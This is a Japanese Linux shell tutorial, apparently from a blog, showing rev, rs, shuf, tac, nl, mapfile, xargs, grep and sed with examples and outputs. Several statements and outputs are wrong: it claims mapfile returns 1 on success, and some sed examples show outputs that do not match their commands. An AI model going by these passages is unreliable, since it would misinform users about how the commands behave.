./dir2/header3.h ./text1.txt ./text2.txt ./dir/text3.txr ドメイン名リストのソート www1・www2 などのサブドメインではなく、example.com や example.net などのドメインでソートしたいとする。\nその場合、rev コマンドで逆順にし、ソートし、再度 rev コマンドで戻すとよい。\nドメイン名リスト\nwww1.example.com www-a.example-b.com www1.example.net www-b.example-b.com www2.example.com www2.example.net 実行結果\n$ cat foo.txt | rev | sort | rev www-a.example-b.com www-b.example-b.com www1.example.com www2.example.com www1.example.net www2.example.net rsコマンド rsコマンドは、行列を入れ替えるコマンドです。\n行列を入れ替える処理は、これはもう頻繁に起こるのです。\nそのたびに頭を悩ませることになります。\nプログラマのほとんどの人は、プログラムを書くよりもGoogleで調べる時間、\nソートのアルゴリズムを最適化するよりも、効率的な行列入れ替えのプログラムに頭を悩ませる時間のほうが多いかもしれません。\n結論。\n「行列入れ替えのプログラムを書く必要はありません、もうあります」\n行列の入れ替え 例えば以下のような表形式のテキストファイルがあるとします。\n$ cat sample.txt 1 2 3 4 5 6 7 8 9 では行列を入れ替えます。\nrs -Tコマンドで簡単に入れ替えることができます。\n$ cat sample.txt | rs -T 1 4 7 2 5 8 3 6 9 awkコマンドで頑張ってみる場合 $ cat sample.txt 1 2 3 4 5 6 7 8 9 $ cat sample.txt | awk \u0026#39; { for(i=1;i\u0026lt;=NF;i++){a[NR,i]=$i}} NF\u0026gt;p {p=NF} END{ for(j=1;j\u0026lt;=p;j++){str=a[1,j]; for(i=2;i\u0026lt;=NR;i++){str=str\u0026#34; \u0026#34;a[i,j];} print str } }\u0026#39; 1 4 7 2 5 8 3 6 9 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ shufコマンド shufはファイルやキーボードから入力した内容をシャッフル（shuffle）して出力するコマンドです。\n乱数を扱う$RANDOMコマンドとは異なり、同じものが2回出力されることはありません。\n「1から10までの数字をランダムな順番で1回ずつ出力する」といった使い方も可能です。\n基本的な使い方 パイプから入力を受け付けた要素(行)をシャッフル(ランダムに並べ替え)するという使い方になります。\nseq 1 10 | shuf 10 3 7 1 6 9 5 2 8 4 出力する数を制限する shuf -n N で、シャッフルした各要素からN個のデータを抽出して出力させる事ができます。\n$ seq 1 10 | shuf 7 6 4 5 10 2 1 3 8 9 $ seq 1 10 | shuf -n3 8 7 4 数値の幅を制限する 001から020までをランダムに出力してみます。\nbash-5.1$ shuf -e {001..020} 006 002 016 011 018 009 008 005 017 014 004 013 010 015 019 007 003 001 012 020 bash-5.1$ さらにこの出力から５つに絞って出力します。\nbash-5.1$ shuf -e {001..020} 006 002 016 011 018 009 008 005 017 014 004 013 010 015 019 007 003 001 012 020 bash-5.1$ shuf -e {001..020} -n5 018 011 008 006 020 bash-5.1$ ヒント どんなときに使えばよいのかわかりませんが、いざというときのために（？）頭のすみっこにおいておいてください。 tacコマンド tac コマンドはファイルの内容を逆順に出力するコマンドです。\n最後の行が最初に表示されます。\ntac という言葉は、cat という言葉の逆です。\ntacコマンドの機能も、catコマンドの逆です。\n通常のcatコマンドの実行結果\n$ cat thegeekstuff.txt 1. Linux Sysadmin, Scripting etc., 2. Databases Oracle, mySQL etc., 3. Hardware 4. Security (Firewall, Network, Online Security etc) 5. Storage 6. Cool gadgets and websites 7. Productivity (Too many technologies to explore, not much time available) 8. Website Design 9. Software Development 10. Windows Sysadmin, reboot etc., 11. Adding 1\u0026#39;s and 0\u0026#39;s tac コマンドの実行結果\n$ tac thegeekstuff.txt 11. Adding 1\u0026#39;s and 0\u0026#39;s 10. Windows Sysadmin, reboot etc., 9. Software Development 8. Website Design 7. Productivity (Too many technologies to explore, not much time available) 6. Cool gadgets and websites 5. Storage 4. Security (Firewall, Network, Online Security etc) 3. Hardware 2. Databases Oracle, mySQL etc., 1. Linux Sysadmin, Scripting etc., 単語を逆順に並べるには -s というオプションで区切り文字を指定できるので、行ではなく単語を逆順に並べることもできる。\n$ echo -n \u0026#34;I\u0026#39;m feeling lucky.\u0026#34; | tac -s \u0026#39; \u0026#39; lucky.feeling I\u0026#39;m さらに -r というオプションを使えば正規表現で区切り文字を指定できる。\n$ echo -n \u0026#34;I\u0026#39;m feeling lucky.\u0026#34; | tac -r -s \u0026#39;[^a-zA-Z]\u0026#39; lucky.feeling m I\u0026#39; catコマンドと同様の書式でファイルの結合 ２つのファイルがあります。\n$ cat file_name1 abcde fghij klmno $ cat file_name2 pqrst uvwxy z1234 ２つのファイルをtacで結合すると以下の通りになります。\n$ tac file_name1 file_name2 klmno fghij abcde z1234 uvwxy pqrst tacでファイルを結合する場合は、各ファイルごとに最終行から逆に並べ替えた上で結合を行います。\nこのときの結果は、下記の様に catで結合した上で tacコマンドで並び替えたときの結果とは異なります。\n$ cat file_name1 file_name2 | tac z1234 uvwxy pqrst klmno fghij abcde ヒント どちらでも良いのではなく、後者を覚えましょう。 結合したファイルをファイルに出力 また、結合したファイルをファイルに出力する場合は、リダイレクトを使用します。\n$ cat file_name1 file_name2 | tac \u0026gt; file_name3 こうすると、実行内容を画面に表示しながらファイルに出力できますね。\n$ cat file_name1 file_name2 | tac | tee file_name3 tacコマンドには行番号を表示するオプションがない catコマンドには行番号を表示する「-n」オプションがありますが、「tac」コマンドにはこれに類似するオプションはありません。\nそのため、行番号を表示する場合は、下記の様に catコマンドか、nlコマンドを併用します。\ncat -n または、nl こまんどで行番号を振ります！\n$ tac file_name1 | cat -n $ tac file_name1 | nl nlコマンド nl コマンドは、テキストファイルを行番号付きで出力するコマンドです。\ncat -n コマンドでも行番号を付けることができますが、nl コマンドでは、正規表現など、より細かい設定が可能です。\n行番号をつける ファイルに行番号を追加するには、ファイルの名前をnl コマンドに渡すだけです。\nデフォルトでは、ファイルのすべての行に行番号が追加されます。例として、以下の出力を参照してください。\nbash-5.1$ nl distros.txt 1\tAlmaLinux 2\tArch Linux 3\tCentOS 4\tDebian 5\tFedora 6\tGentoo 7\tManjaro 8\topenSUSE 9\tRed Hat 10\tUbuntu bash-5.1$ これはこれで非常に便利なのですが、デフォルトでは、出力にタブ文字、行番号、がテキストの前に追加されました。\nこれは、特定のデータ文字列がどの行に表示されるかをすばやく確認するための優れた方法です。\nしかし、他の状況ではあまり役に立たないかもしれません。\nこの出力のフォーマットを変更する方法を以下に示します。\n行番号の書式を変更する 書式を少し変更してみます。\n行番号をフォーマットする一般的な方法の １つは、番号の後にピリオドを置くことです。\nnl -s のように-sオプションを使用します。\nbash-5.1$ nl -s \u0026#34;. \u0026#34; distros.txt 1. AlmaLinux 2. Arch Linux 3. CentOS 4. Debian 5. Fedora 6. Gentoo 7. Manjaro 8. openSUSE 9. Red Hat 10. Ubuntu bash-5.1$ 行番号の手前のスペースを調整 行番号前のスペースを調整したい場合、nl -w (width) オプションで調整することができます。\nスペースを完全に取り除くには、nl -w1 （幅１）を指定します。\n-sオプションを引き続き使用していることに注意してください。\nこれにより、両方の書式設定の変更が反映されます。\nbash-5.1$ nl -w3 -s \u0026#34;. \u0026#34; distros.txt 1. AlmaLinux 2. Arch Linux 3. CentOS 4. Debian 5. Fedora 6. Gentoo 7. Manjaro 8. openSUSE 9. Red Hat 10. Ubuntu bash-5.1$ 開始番号を指定する 1 以外の番号から番号付けを開始したい場合は、-vオプションをnlと共に使用して、別の番号を指定できます。\n例として、行番号を 100 から開始します。\nbash-5.1$ nl -v100 -w3 -s \u0026#34;. \u0026#34; distros.txt 100. AlmaLinux 101. Arch Linux 102. CentOS 103. Debian 104. Fedora 105. Gentoo 106. Manjaro 107. openSUSE 108. Red Hat 109. Ubuntu bash-5.1$ catコマンドで頑張ってみる もちろん、cat こまんどでもできますが、調整はパイプで繋いでsed を使うなどするしかありません。\nbash-5.1$ cat -n distros.txt 1\tAlmaLinux 2\tArch Linux 3\tCentOS 4\tDebian 5\tFedora 6\tGentoo 7\tManjaro 8\topenSUSE 9\tRed Hat 10\tUbuntu bash-5.1$ awkコマンドで頑張ってみる cat -n コマンドでの実現で、微調整にsedコマンドが必要なのであれば、最初からsedコマンドで行う方法もあります。\nbash-5.1$ awk \u0026#39;{print NR, $0}\u0026#39; distros.txt 1 AlmaLinux 2 Arch Linux 3 CentOS 4 Debian 5 Fedora 6 Gentoo 7 Manjaro 8 openSUSE 9 Red Hat 10 Ubuntu bash-5.1$ 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ ヒント やり方は無限にあります。 解決方法は１つではありませんので、色々考えて見てください。 mapfile（マップファイル） bash シェルの mapfile コマンドは、読み取り配列としてよく知られています。\n主な目的は、標準入力行を読み取り、それらをインデックス付き配列変数に格納することです。\nmapfile は、パイプではなく置換 (\u0026lt;) から読み取る必要があります。\nさらに、読み取りループと比較して、mapfile ははるかに高速で便利なソリューションです。\nコマンドの実行が成功した場合は 1 を返し、失敗した場合は 0 を返します。\n配列名を指定しない場合、mapfile 変数がデフォルトの配列変数となります。\nデータテキストの準備 ここで簡単なデータテキスト用意します。\nOne Two Three 普通のやり方 while read パターン このテキストを読み込んで配列にデータを格納したいと思います。\n多少冗長ではありますが通常は以下のような感じになります。\n#!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 declare -i COUNT=0; # カウンターの宣言 IFS=$\u0026#39;\\n\u0026#39;; # 区切り文字を改行コードに指定 while read line;do # １行ずつ読み込んだ内容 $line を配列に代入 aLine[$COUNT]=\u0026#34;$line\u0026#34;; ((COUNT++)); # インクリメント done\u0026lt;$DATAFILE # ファイルの入力 echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash array01.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ 普通のやり方 fileコマンドパターン ファイルの読み込みを以下のようにすることもできますね。\n#!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 declare -i COUNT=0; # カウンターの宣言 IFS=$\u0026#39;\\n\u0026#39;; # 区切り文字を改行コードに指定 # ファイルを配列に読み込む file=(`cat \u0026#34;$DATAFILE\u0026#34;`) # 行ごとに繰り返し処理を実行 for line in \u0026#34;${file[@]}\u0026#34;; do # １行ずつ読み込んだ内容 $line を配列に代入 aLine[$COUNT]=\u0026#34;$line\u0026#34;; ((COUNT++)); # インクリメント done echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash array02.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ 登場！ mapfile を使う なんと、ファイル読み込みや配列への代入にあれこれやっていましたが、mapfileを使うと１行で住みます。\nCOUNT変数といったカウンターや IFSといった定義も不要です。\nOne Two Three Four Five Six Seven Eight Nine Ten #!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 # -t は行末の改行を除去 mapfile -t aLine \u0026lt; \u0026#34;$DATAFILE\u0026#34;; echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果はいずれも同じですが以下のとおりです。\nbash-3.2$ bash array03.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ すごいですね。\n配列に入れるだけならmapfileで十分です。しかも読み込み専用ということもあり、読み込み速度は通常の数十倍高速です。\n列の代入 ここで余談ですが、これまでは行の読み込みを行い、行を単位に配列に格納してきました。\n列の中で空白区切りで値が入っている場合の配列への代入はどうしましょう？\nこうなります。\n#!/usr/bin/bash # １行に３つの値が空白区切りで並んでいます read -a aLine \u0026lt;\u0026lt;\u0026lt; \u0026#34;One Two Three\u0026#34; echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash col.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ データファイルからの入力 では、データファイルの構造を少し複雑にしてみます。\nOne Two Three Four Five Six Seven Eight Nine Ten mapfileコマンドで行の内容を配列に入れる方法は説明しましたが、今回は、行の中で空白区切りの値が３つあります。\nこうしたデータ構造をmapfileに加えてreadコマンドを使って効率的に、かつ高速に読み込んでみます。\n#!/usr/bin/bash DATAFILE=\u0026#34;data02.txt\u0026#34;; declare -a aLine; # データファイルを読み込みます。 mapfile -t aLine\u0026lt;\u0026#34;$DATAFILE\u0026#34;; for((i=0;i\u0026lt;4;i++));do # 行の内容を読み込み、空白区切りで配列に格納します read -a var \u0026lt;\u0026lt;\u0026lt; \u0026#34;${aLine[$i]}\u0026#34;; echo \u0026#34;varの中身は以下の通り\u0026#34;; echo \u0026#34;${var[@]}\u0026#34;; echo \u0026#34;添字の0を表示\u0026#34; echo ${var[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${var[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${var[2]}; # Three done 実行結果は以下のとおりです。\nbash-3.2$ bash colArray.sh varの中身は以下の通り One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three varの中身は以下の通り Four Five Six 添字の0を表示 Four 添字の1を表示 Five 添字の2を表示 Six varの中身は以下の通り Seven Eight Nine 添字の0を表示 Seven 添字の1を表示 Eight 添字の2を表示 Nine varの中身は以下の通り Ten 添字の0を表示 Ten 添字の1を表示 添字の2を表示 bash-3.2$ 最後の行は値が一つしかありません（Ten）\n必要であれば値がない場合は出力しないなどの処理をすれば良さそうです。\n（配列的には別に値がなくても問題はないと思いますが）\nmapfileとreadコマンドを上手に使って、効率的に配列に代入してください。\nxargs タブを区切り文字として設定 (デフォルト: スペース) xargs -d\\t コマンドを実行する前にコマンドをプロンプトする ls|xargs -L1 -p head 1 行に 3 項目を表示 echo 1 2 3 4 5 6| xargs -n3 # 1 2 3 # 4 5 6 実行前のプロンプト echo a b c |xargs -p -n3 find の結果を rm する find . -name \u0026#34;*.html\u0026#34;|xargs rm ファイル名に空白が含まれるファイルを削除します (例: 「hello 2001」) find . -name \u0026#34;*.c\u0026#34; -print0|xargs -0 rm -rf ファイルをフォルダに移動 find . -name \u0026#34;*.bak\u0026#34; -print 0|xargs -0 -I {} mv {} ~/old または、\nfind . -name \u0026#34;*.bak\u0026#34; -print 0|xargs -0 -I file mv file ~/old 最初の 100 番目のファイルをディレクトリ (例: d1) に移動します。 ls |head -100|xargs -I {} mv {} d1 並行処理 time echo {1..5} |xargs -n1 -P5 sleep すべてのファイルを A から B にコピーします find /dir/to/A -type f -name \u0026#34;*.py\u0026#34; -print 0| xargs -0 -r -I file cp -v -p file --target-directory=/path/to/B ファイル名をファイルの最初の行に追加します ls |sed \u0026#39;s/.txt//g\u0026#39;|xargs -n1 -I file sed -i -e \u0026#39;1 i\\\u0026gt;file\\\u0026#39; file.txt すべてのファイルの行数を出力 ls |xargs -n1 wc -l 出力を 1 行にする ls -l| xargs すべてのファイルの行をカウントし、合計行もカウントします ls|xargs wc -l Xargs と grepを組み合わせる cat grep_list |xargs -I{} grep {} filename Xargs と sed (/etc ディレクトリの下のすべての古い IP アドレスを新しい IP アドレスに置き換えます) grep -rl \u0026#39;192.168.1.111\u0026#39; /etc | xargs sed -i \u0026#39;s/192.168.1.111/192.168.2.111/g\u0026#39; grepコマンド コマンドの実行結果から必要な箇所だけを抽出する 単語単位で検索する 前後の行も表示する 行番号付きで表示する 複数の文字列を指定して検索する 複数の文字列を指定して検索する（正規表現） 検索文字列をファイルから読み込む どちらも含む行を探したい場合 文字列を含まない行を対象にする grepコマンド概要 grepコマンドは、ファイル中の「文字列（パターン）」が含まれている行を表示するコマンドで、UNIX/Linuxで、最も頻度高く利用されているコマンドの一つです。\n文章中に検索したい文字列の位置や頻出回数を確認する\nディレクトリ中のファイル一覧を作成し、そのファイル一覧から、該当するファイル名を探索する。\nヒント 抽出した結果をさらに「パイプ｜コマンド」で絞り込んだり、その結果を別のファイルに出力したりすることも簡単にできます。 grepコマンドの書式 grep [オプション] 検索パターン ファイル\nコマンド | grep [オプション] 検索パターン\ngrepコマンドの主なオプション オプション 意味 -i 大文字と小文字を区別しない -v パターンに一致しない行を表示する -n 行番号を併せて表示する -C 一致した行の前後の行も表示する -e 検索パターンを指定する -f ファイルに書かれているパターンを検索する ヒント 一覧のオプションは一部です。 $ man grep などで、grepの使い方を確認してください。 grepコマンド詳細説明 コマンドの実行結果から必要な箇所だけを抽出する 「dmesg」コマンド（起動時のシステムメッセージを再表示するコマンド）の実行結果から、grepコマンドで“volume”という文字列を含む行だけを表示したい場合は「dmesg | grep volume」と指定します\nシステムメッセージを表示する\n$ dmesg システムメッセージの出力から「volume」を含む行を抽出する\n$ dmesg | grep volume 大文字と小文字を「-iオプション」を付与して区別しないで抽出する\n$ dmesg | grep -i volume ヒント dmesg コマンドは、システムメッセージを表示するコマンドです。 単語単位で検索する 「volume」という文字列を検索したい場合、、検索結果には「volume」と「vboxvolume」が表示される場合もあります。“volumeという単語のみ”を検索対象としたい場合には、「-w」オプション（\u0026ndash;word-regexp）を使用します\n単語単位で検索する\n$ dmesg | grep -i -w volume 前後の行も表示する 文字列を検索する際には、該当する行の前後も表示されていると分かりやすい場合があります。例えば、前後2行ずつ表示したい場合は、「-2」のように数字で指定します。これは「-C（\u0026ndash;context=）」オプションと同じです。\n$ dmesg | grep -w -C2 volume ヒント ログなどでの利用は効果的ではありませんが、ドキュメント内を検索する場合に、GoogleのSnippetのように前後の文章が表示されることで、よりわかりやすくなります。さらに次の項目では、検索結果の評判号を表示させることもできます。 行番号付きで表示する grepコマンドでの検索結果に行番号を付けて表示したい場合は、「-n」オプション（\u0026ndash;line-number）を使用します。「行番号:」のように表示されますが、前後の行も併せて表示している場合は、前後の行は「行番号-」のように「-」記号で、該当する行は「:」記号で示されます。\n$ dmesg | grep -w -C2 -n volume 複数の文字列を指定して検索する grepコマンドで「volumeまたはkeybagを含む行を検索」のように、複数の文字列を検索したい場合には、「-e」オプションを付けて、それぞれが「検索パターン」であることを明示します。\n$ dmesg | grep -i -e keybag -e volume 複数の文字列を指定して検索する 複数の文字列を検索したい場合、正規表現で“または”という意味の「|」記号を使って指定することもできます。\n$ dmesg | grep -i \u0026#34;keybag\\|volume\u0026#34; ヒント ここでは OR 条件で抽出することを目的としています。AND条件で抽出する場合は、grep コマンドを「|」パイプコマンドで連結させます。 どちらの検索ワードも含む行\n$ dmesg | grep -i volume | grep -i keybag 検索文字列をファイルから読み込む 検索したい文字列が常に決まっている場合や、他のコマンドで単語をリストアップしているなどで、検索文字列のリストがあるような場合、「-f」オプションでリストのファイルを指定するとよいでしょう。\n$ cat wordlist keybag volume $ dmesg | grep -i -f wordlist ヒント この使い方は意外と知られていないのです。一般的にはwordlistをシェルスクリプトであらかじめ作成しておき、while read line; do などで wordlistを順番にgrepコマンドに渡す手法が多いです。 :\u0026gt; wordlist echo \u0026#34;keybag\u0026#34; \u0026gt;\u0026gt; wordlist; echo \u0026#34;volume\u0026#34; \u0026gt;\u0026gt; wordlist; cat wordlist | while read line; do echo \u0026#34;$line での検索\u0026#34;; dmesg | grep \u0026#34;$line\u0026#34; ; echo \u0026#34;\u0026#34;; done どちらも含む行を探したい場合 「どちらの検索ワードも含む行」としたい場合は、検索結果をさらにgrepするのが簡単です。\n$ dmesg | grep -i volume $ dmesg | grep -i keybag # どちらの検索ワードも含む行 $ dmesg | grep -i volume | grep -i keybag 文字列を含まない行を対象にする grepコマンドで「～を含まない行」だけを表示したい場合は「-v」オプション（「\u0026ndash;invert-match」オプション）を使います。\n# keybag を含みvolumeを含まない検索結果 $ dmesg | grep -i keybag | grep -v volume ヒント -v オプションはgrepコマンドのオプションの中で最も強力で利用頻度が高いです。「パターンに一致しない行を表示する」という意味合いとなります。 sedコマンド 「sed」は「Stream EDitor」の略で、「sed スクリプトコマンド ファイル名」で、指定したファイルをコマンドに従って処理し、標準出力へ出力します。ファイル名を省略した場合は、標準入力からのデータを処理します。sedコマンドでは、パイプとリダイレクトを活用するのが一般的です。\nsedコマンドの書式 sed [オプション]\nsed [オプション] スクリプトコマンド 入力ファイル\nsedコマンドの主なオプション オプション 意味 -e スクリプト スクリプト（コマンド）を追加する -f スクリプトファイル 実行するコマンドとしてスクリプトファイルの内容を追加する |-t 文字数\t|タブの文字数またはタブ位置のリストを指定する|\nsedのバージョンを確認する $ sed --version 僕の環境では以下のとおりです\nbash-5.1$ sed --version gsed (GNU sed) 4.8 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Written by Jay Fenlason, Tom Lord, Ken Pizzini, Paolo Bonzini, Jim Meyering, and Assaf Gordon. This sed program was built without SELinux support. GNU sed home page: \u0026lt;https://www.gnu.org/software/sed/\u0026gt;. General help using GNU software: \u0026lt;https://www.gnu.org/gethelp/\u0026gt;. E-mail bug reports to: \u0026lt;bug-sed@gnu.org\u0026gt;. bash-5.1$ sedコマンド詳細説明 \u0026lsquo;sed\u0026rsquo;を使用した基本的なテキスト置換 sedコマンドを使用してパターンを検索および置換することにより、テキストの特定の部分を検索および置換できます。次の例では、「s」は検索および置換タスクを示します。「BashScriptingLanguage」というテキストで「Bash」という単語が検索され、その単語がテキストに存在する場合は、「Perl」という単語に置き換えられます。\nbash-5.1$ echo \u0026#34;Bash Scripting Language\u0026#34; | sed \u0026#39;s/Bash/Perl/\u0026#39; Perl Scripting Language bash-5.1$ ヒント \u0026rsquo;\u0026rsquo; シングルクォーテーションで囲む場合と\u0026quot;\u0026ldquo;ダブルクォーテーションで囲む場合、動作が異なります。置換前と、置換後の文字列指定を「文字列」で扱う場合はシングルクォーテーションで構いませんが、s/Bash/$value/ などの変数で置き換えたい場合はダブルクォーテーションで囲みます。 ヒント s/Bash/Perl/ と指定する場合の s ですが、substitute（置き換える）です。 まず、weekday.txtを作成します。\nMonday Tuesday Wednesday Thursday Friday Saturday Sunday 以下のコマンドで Sunday を　Sunday is holiday に置き換えます\n$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; 実行結果は以下のとおりです。\nbash-5.1$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; Monday Tuesday Wednesday Thursday Friday Saturday Sunday is holiday bash-5.1$ \u0026lsquo;g\u0026rsquo;オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える \u0026lsquo;g\u0026rsquo;オプションは、ファイル内の一致するパターンすべてを置き換えます。\nまずpython.txtを作成します\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 以下のコマンドで Python を perl に置き換えます。\n$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; perl is a very popular language. perl is easy to use. perl is easy to learn. perl is a cross-platform language ヒント s/Python/perl/g と指定する場合の g ですが、global(全体的に）です。 次に２行目の Python を perlに置き換えます。\n置き換えたい行数を 2 と指定しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; Python is a very popular language. perl is easy to use. perl is easy to learn. Python is a cross-platform language 各行で一致する2番目の値のみを置き換える ファイル中に存在するPythonを、各行の2番目に出現する検索パターンだけをperlに置き換えます。\ng2オプションを使います。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g2\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ 各行で一致する最後の値のみを置き換える ファイル中に存在するPythonを、各行の最後に出現する検索パターンだけをperlに置き換えます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/\\(.*\\)Programming/\\1Scripting/\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ ヒント \\(.*\\) の部分は正規表現といいます。正規表現は記号を含めて無限に指定することができる激しく便利な機能です。ポピュラーな使い方から覚えて、次第と複雑でトリッキーな使い方を習得していけば良いと思います。Google で sed 正規表現　と検索すればたくさん検索結果が出てきます。 ファイル内の最初の一致を新しいテキストに置き換える 次のコマンドは、検索パターンの最初の一致である「Python」のみをテキスト「perl」に置き換えます。ここで、「1」はパターンの最初の出現に一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;1 s/Python/perl/\u0026#39; perl is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language ファイル内の最後の一致を新しいテキストに置き換える 次のコマンドは、最後に出現した検索パターン「Python」をテキスト「Bash」に置き換えます。ここで、「$」記号は、パターンの最後の出現と一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;$s/Python/perl/\u0026#39; Python is a very popular language. Python is easy to use. Python is easy to learn. perl is a cross-platform language ヒント 「ファイル内」の最後のマッチです。 ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ 検索および置換するには、ファイルパスのバックスラッシュをエスケープする必要があります。次のsedコマンドは、ファイルパスにバックスラッシュ記号（\\）を追加します。\nヒント \\記号はウインドウズだと￥で表示されます。\nMacでは￥キーを押すことで\\バックスラッシュを入力することできます。\nMacで￥キーを押してもバックスラッシュが入力できない場合は、はOptionキーを押しながら￥を押すことでバックスラッシュを入力することができます。一般的に￥と\\は区別されています。 実行結果は以下のとおりです。\n$ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s;/;\\\\/;g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl $ $ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s|/|\\\\/|g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl ヒント 上記では「s;」とすることで、セミコロンを区切り文字として指定しています。理由は見た目がわかりやすいからです。\n何でもいいのです。「s|」とすれば、区切り文字はパイプに指定することができます。 ファイルのフルパスをファイル名だけに置き換える ファイル名は、basenameコマンドを使用してファイルパスから非常に簡単に取得できますが、sedコマンドを使用して、ファイルパスからファイル名を取得することもできます。次のコマンドは、echoコマンドで指定されたファイルパスからのみファイル名を取得します。\n$ basename \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; myfile.txt $ echo \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; | sed \u0026#39;s/.*\\///\u0026#39; myfile.txt $ ヒント basename コマンドを使うのが一般的ですが、sedに置き換えることでsedの正規表現の理解を深めることが狙いです。 マッチした文字列のあとに出現した文字列が見つかった場合に置換する 次のsedコマンドでは、2つの置換コマンドが使用されています。文字列「CSE 」でマッチした行で「Count 」は100に置き換えられ、文字列「EEE」でマッチした行で「Count」は70に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed -e \u0026#39;/CSE/ s/Count/100/; /EEE/ s/Count/70/;\u0026#39; CSE - 100 EEE - 70 Civil - Count ヒント 以外に知られていないトリッキーなsedの利用例ですが、とてもよく使われます。 文字列に他のテキストが見つからない場合のみテキストを置き換える 次のsedコマンドは、テキスト「CSE」を含まない行の「Count」値を置き換えます。dept.txtファイルには、テキスト「CSE」を含まない2行が含まれています。したがって、「カウント」テキストは2行で80に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed \u0026#39;/CSE/! s/Count/80/;\u0026#39; CSE - Count EEE - 80 Civil - 80 ヒント !（アポストロフィー）をつけると「以外は」という意味になります。 \u0026rsquo; \\ 1 \u0026lsquo;を使用して、一致するパターンの前に文字列を追加 